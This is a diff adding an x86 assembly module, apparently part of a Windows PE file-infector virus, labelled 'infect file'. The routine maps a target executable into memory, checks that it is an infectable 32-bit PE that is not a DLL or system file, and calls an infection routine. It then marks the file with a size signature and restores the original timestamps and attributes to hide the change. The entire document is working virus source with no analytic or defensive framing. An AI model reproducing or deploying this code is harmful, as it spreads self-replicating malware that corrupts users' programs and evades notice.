@@ -1,0 +1,165 @@
+;%%%3 0 FINF infect file
+
+;###SetFileTime
+;###SetFileAttributesA
+;###CreateFileA
+;###CreateFileMappingA
+;###MapViewOfFile
+;###UnmapViewOfFile
+;###CloseHandle
+;###SetFilePointer
+;###SetEndOfFile
+
+WORKSIZE	EQU	256*1024
+
+;map the file in memory, and check if is a infectable PE file
+
+map_infect:
+	pushad
+
+	call delta
+
+        mov edi,[esp.cPushad.Pshd.WFD_nFileSizeLow]
+	lea esi,[esp.cPushad.Pshd.WFD_szFileName]
+
+;first of all, remove file attribute
+
+        push FILE_ATTRIBUTE_NORMAL
+        push esi
+        call [ebp+_SetFileAttributesA]
+        test eax,eax
+        jz @@error
+
+;check if file is already infected (file size / 16 = 13)
+
+        mov eax,edi
+        and eax,15
+	xor eax,13
+	jz @@error_fixatt
+
+;open file
+
+        push 0
+        push FILE_ATTRIBUTE_NORMAL
+        push OPEN_EXISTING
+        push 0
+        push FILE_SHARE_READ
+        push GENERIC_WRITE+GENERIC_READ
+        push esi
+        call [ebp+_CreateFileA]
+        mov ebx,eax
+        inc eax
+        jz @@error_fixatt
+
+	add edi,WORKSIZE
+
+;create map
+
+        push 0
+        push edi
+        push 0
+        push PAGE_READWRITE
+        push 0
+        push ebx
+        call [ebp+_CreateFileMappingA]
+        test eax,eax
+        jz @@close_file
+	mov edi,eax
+
+;map file
+
+        push 0
+        push 0
+        push 0
+        push FILE_MAP_ALL_ACCESS
+        push edi
+        call [ebp+_MapViewOfFile]
+        test eax, eax
+        je @@close_map
+
+        push eax
+
+;check if the file is in PE file format
+
+        cmp [eax.MZ_magic],IMAGE_DOS_SIGNATURE
+        jnz @@close_view
+
+        mov ecx,[eax.MZ_lfanew]
+        cmp ecx,[esp.cPushad.Pshd.WFD_nFileSizeLow+4]
+	jae @@close_view
+
+        cmp [ecx+eax.NT_Signature],IMAGE_NT_SIGNATURE
+        jnz @@close_view
+
+;and check if it is infectable
+
+        cmp [ecx+eax.NT_FileHeader.FH_Machine],IMAGE_FILE_MACHINE_I386
+        jnz @@close_view
+
+        cmp [ecx+eax.NT_OptionalHeader.OH_Magic],IMAGE_NT_OPTIONAL_HDR_MAGIC
+        jnz @@close_view
+
+        movzx ecx,[ecx+eax.NT_FileHeader.FH_Characteristics]
+
+        test ecx,IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE
+        jz @@close_view
+
+        test ecx,IMAGE_FILE_SYSTEM+IMAGE_FILE_DLL
+        jnz @@close_view
+
+;infect file!
+
+	mov ecx,[esp.cPushad.Pshd.WFD_nFileSizeLow.Pshd]
+	call infect_image
+
+;mark file as infected
+
+	add eax,15
+        and eax,not 15
+        add eax,13
+	mov [esp.cPushad.Pshd.WFD_nFileSizeLow.Pshd],eax
+
+  @@close_view:
+        call [ebp+_UnmapViewOfFile]
+
+  @@close_map:
+        push edi
+        call [ebp+_CloseHandle]
+
+;set new file size
+
+        push NULL
+        push NULL
+        push dwo [esp.cPushad.Pshd.WFD_nFileSizeLow.(Pshd*2)]
+        push ebx
+        call [ebp+_SetFilePointer]
+
+        push ebx
+        call [ebp+_SetEndOfFile]
+
+;restore time/date stamp
+
+  @@close_file:
+        lea eax,[esp.cPushad.Pshd.WFD_ftLastWriteTime.FT_dwLowDateTime]
+        push eax
+	add eax,8
+        push eax
+	add eax,8
+        push eax
+        push ebx
+        call [ebp+_SetFileTime]
+
+  	push ebx
+  	call [ebp+_CloseHandle]
+
+;restore file attributes
+
+  @@error_fixatt:
+        push [esp.cPushad.Pshd.WFD_dwFileAttributes]
+        push esi
+        call [ebp+_SetFileAttributesA]
+
+  @@error:
+	popad
+	ret
+
